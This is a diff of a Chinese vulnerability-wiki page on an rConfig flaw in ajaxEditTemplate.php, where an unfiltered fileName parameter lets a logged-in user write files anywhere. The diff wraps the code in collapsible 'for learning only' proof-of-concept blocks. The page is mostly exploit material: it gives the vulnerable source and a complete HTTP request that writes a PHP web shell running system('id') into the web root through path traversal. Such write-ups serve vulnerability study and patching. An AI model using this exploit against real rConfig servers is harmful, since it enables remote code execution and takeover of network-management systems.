@@ -25,28 +25,30 @@ rConfig
 
 ```
 app="rConfig"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 漏洞文件为 **rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php**
 
 ```php
-<?php
+&lt;?php
 require_once("/home/rconfig/classes/usersession.class.php");
 require_once("/home/rconfig/classes/ADLog.class.php");
 require_once("/home/rconfig/classes/spyc.class.php");
 require_once("/home/rconfig/config/functions.inc.php");
 
 $log = ADLog::getInstance();
-if (!$session->logged_in) {
-    echo 'Don\'t bother trying to hack me!!!!!<br /> This hack attempt has been logged';
-    $log->Warn("Security Issue: Some tried to access this file directly from IP: " . $_SERVER['REMOTE_ADDR'] . " & Username: " . $session->username . " (File: " . $_SERVER['PHP_SELF'] . ")");
+if (!$session-&gt;logged_in) {
+    echo 'Don\'t bother trying to hack me!!!!!&lt;br /&gt; This hack attempt has been logged';
+    $log-&gt;Warn("Security Issue: Some tried to access this file directly from IP: " . $_SERVER['REMOTE_ADDR'] . " &amp; Username: " . $session-&gt;username . " (File: " . $_SERVER['PHP_SELF'] . ")");
     // need to add authentication to this script
     header("Location: " . $config_basedir . "login.php");
 } else {
-    $ymlData = Spyc::YAMLLoad($_POST['code']);
-    $fileName = $_POST['fileName'];
+    $ymlData = Spyc::YAMLLoad(&#36;_POST['code']);
+    $fileName = &#36;_POST['fileName'];
     $check_yml_extension = explode('.', $fileName);
     if(@!array_key_exists($check_yml_extension[1])){
         if(@$check_yml_extension[1] != 'yml'){
@@ -66,84 +68,96 @@ if (!$session->logged_in) {
         chown('templates', 'apache');
     }
 
-    // if'' to create the filename based on the command if not created & chmod to 666
+    // if'' to create the filename based on the command if not created &amp; chmod to 666
     if (!file_exists($fullpath)) {
-        exec("touch " . $fullpath);
+        &#101;xec("touch " . $fullpath);
         chmod($fullpath, 0666);
     }
     // if the file is alread in place chmod it to 666 before writing info
     chmod($fullpath, 0666);
 
-    // dump array into file & chmod back to RO
+    // dump array into file &amp; chmod back to RO
     $filehandle = fopen($fullpath, 'w+');
-    file_put_contents($fullpath, $_POST['code']);
+    file_put_contents($fullpath, &#36;_POST['code']);
     fclose($filehandle);
     chmod($fullpath, 0444);
  
-    $db2->query("UPDATE `templates` SET `fileName` = :fileName, `name` = :name, `desc` = :desc, `dateLastEdit` = NOW(), `addedby` = :username WHERE `id` = :id");
-    $db2->bind(':id', $_POST['id']);
-    $db2->bind(':fileName', $fullpath);
-    $db2->bind(':name', $ymlData['main']['name']);
-    $db2->bind(':desc', $ymlData['main']['desc']);
-    $db2->bind(':username', $username);
+    $db2-&gt;query("UPDATE `templates` SET `fileName` = :fileName, `name` = :name, `desc` = :desc, `dateLastEdit` = NOW(), `addedby` = :username WHERE `id` = :id");
+    $db2-&gt;bind(':id', &#36;_POST['id']);
+    $db2-&gt;bind(':fileName', $fullpath);
+    $db2-&gt;bind(':name', $ymlData['main']['name']);
+    $db2-&gt;bind(':desc', $ymlData['main']['desc']);
+    $db2-&gt;bind(':username', $username);
 
-    $queryResult = $db2->execute();
+    $queryResult = $db2-&gt;execute();
     /* Update successful */
-    if ($queryResult && file_exists($fullpath)) {
+    if ($queryResult &amp;&amp; file_exists($fullpath)) {
         $response = "success";
-        $log->Info("Success: Template: ".$fullpath." edited in templates folder");
+        $log-&gt;Info("Success: Template: ".$fullpath." edited in templates folder");
     }
     /* Update failed */ else {
         $response = "failed";
-        $log->Warn("Success: Could not edit Template ".$fullpath." in templates folder");
+        $log-&gt;Warn("Success: Could not edit Template ".$fullpath." in templates folder");
     }
     echo json_encode($response);    
-}  // end session check
-```
+}  // end session check</code></pre>
+
+</details>
 
 关键代码如下
 
-```php
-// if'' to create the filename based on the command if not created & chmod to 666
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-php">// if'' to create the filename based on the command if not created &amp; chmod to 666
     if (!file_exists($fullpath)) {
-        exec("touch " . $fullpath);
+        &#101;xec("touch " . $fullpath);
         chmod($fullpath, 0666);
     }
     // if the file is alread in place chmod it to 666 before writing info
     chmod($fullpath, 0666);
 
-    // dump array into file & chmod back to RO
+    // dump array into file &amp; chmod back to RO
     $filehandle = fopen($fullpath, 'w+');
-    file_put_contents($fullpath, $_POST['code']);
+    file_put_contents($fullpath, &#36;_POST['code']);
     fclose($filehandle);
-    chmod($fullpath, 0444;
-```
+    chmod($fullpath, 0444;</code></pre>
+
+</details>
 
 $fileName -->  $fullpath ---> 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置
 
-```php
-$ymlData = Spyc::YAMLLoad($_POST['code']);
-    $fileName = $_POST['fileName'];
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-php">$ymlData = Spyc::YAMLLoad(&#36;_POST['code']);
+    $fileName = &#36;_POST['fileName'];
     $check_yml_extension = explode('.', $fileName);
     if(@!array_key_exists($check_yml_extension[1])){
         if(@$check_yml_extension[1] != 'yml'){
             $fileName = $fileName . '.yml';
         }
     }
-    $fullpath = $config_templates_basedir+ .$fileName;
-```
+    $fullpath = $config_templates_basedir+ .$fileName;</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162243099.png)
 
-```php
-$filehandle = fopen($fullpath, 'w+');
-file_put_contents($fullpath, $_POST['code']);
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-php">$filehandle = fopen($fullpath, 'w+');
+file_put_contents($fullpath, &#36;_POST['code']);</code></pre>
+
+</details>
 
 POST code 传参写入文件 test.php.yml, 请求包如下
 
-```plain
-POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-plain">POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
 Host: 
 Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7
 Content-Length: 81
@@ -157,8 +171,9 @@ Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 
-fileName=../www/test.php&code=<?php echo system('id');?>&id=1
-```
+fileName=../www/test.php&amp;code=&lt;?php echo &#115;ystem('id');?&gt;&amp;id=1</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162243006.png)
 
